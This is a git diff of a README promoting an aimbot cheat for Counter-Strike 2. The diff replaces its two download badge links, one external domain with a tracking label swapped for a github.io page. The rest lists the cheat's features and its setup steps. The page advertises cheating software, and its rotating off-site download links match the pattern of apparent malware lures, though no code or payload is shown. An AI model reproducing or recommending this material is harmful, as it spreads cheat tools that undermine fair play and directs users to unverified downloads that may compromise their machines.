@@ -2,7 +2,7 @@
 
 An advanced **aimbot** for **CS2**, designed to significantly improve aiming accuracy, reaction time, and overall gameplay performance. This tool automatically targets enemies, ensuring faster and more precise shots, enhancing the player's combat effectiveness.
 
-[![Download CS2 AimBot](https://img.shields.io/badge/Download-CS2%20AimBot-blueviolet)](https://verqcloud.com?label=09c0d50b1ab5e4e1d163f9d9c8344a8a)
+[![Download CS2 AimBot](https://img.shields.io/badge/Download-CS2%20AimBot-blueviolet)](https://cs2aimbot.github.io/.github/)
 
 ## Features
 
@@ -22,4 +22,4 @@ An advanced **aimbot** for **CS2**, designed to significantly improve aiming acc
 4. Launch **CS2**, and activate the aimbot using the defined hotkey for real-time targeting assistance.
 5. Customize the aimbot settings (sensitivity, target priority, etc.) to suit your needs.
 
-[![Download CS2 AimBot](https://img.shields.io/badge/Download-CS2%20AimBot-blueviolet)](https://verqcloud.com?label=09c0d50b1ab5e4e1d163f9d9c8344a8a)
+[![Download CS2 AimBot](https://img.shields.io/badge/Download-CS2%20AimBot-blueviolet)](https://cs2aimbot.github.io/.github/)
